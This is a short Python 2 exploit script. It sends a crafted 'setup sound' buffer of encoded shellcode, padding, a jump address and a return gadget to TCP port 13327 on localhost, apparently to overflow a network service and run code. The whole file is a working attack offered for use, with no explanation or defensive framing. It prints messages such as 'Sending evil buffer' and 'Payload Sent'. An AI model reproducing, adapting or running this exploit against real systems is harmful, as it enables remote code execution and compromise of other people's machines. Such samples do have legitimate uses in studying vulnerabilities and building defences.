#!/usr/bin/python 
import socket

host = "127.0.0.1" 

ret = '\x83\xC0\x0C\xFF\xE0'
jmp = '\xd7\x45\x13\x08'
nopsled = '\x90' * 2
shellcode = (
    "\xbf\x8a\x56\xf3\x01\xdb\xca\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
    "\x14\x31\x78\x14\x03\x78\x14\x83\xc0\x04\x68\xa3\xc2\xda\x9b"
    "\xaf\x76\x9e\x30\x5a\x7b\xa9\x57\x2a\x1d\x64\x17\x10\xbc\x24"
    "\x7f\xa5\x40\xcd\xc3\xc3\x50\x9c\x6b\x9d\xb0\x74\xed\xc5\xff"
    "\x09\x78\xb4\xfb\xba\x7e\x87\x62\x70\xfe\xa4\xda\xec\x33\xaa"
    "\x88\xa8\xa1\x94\xf6\x87\xb5\xa2\x7f\xe0\xdd\x1b\xaf\x63\x75"
    "\x0c\x80\xe1\xec\xa2\x57\x06\xbe\x69\xe1\x28\x8e\x85\x3c\x2a")

crash = shellcode + '\x41' * (4368-105) + jmp + ret + nopsled

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024) 

print data 

s.send(buffer) 
s.close()

print "[*]Payload Sent !"
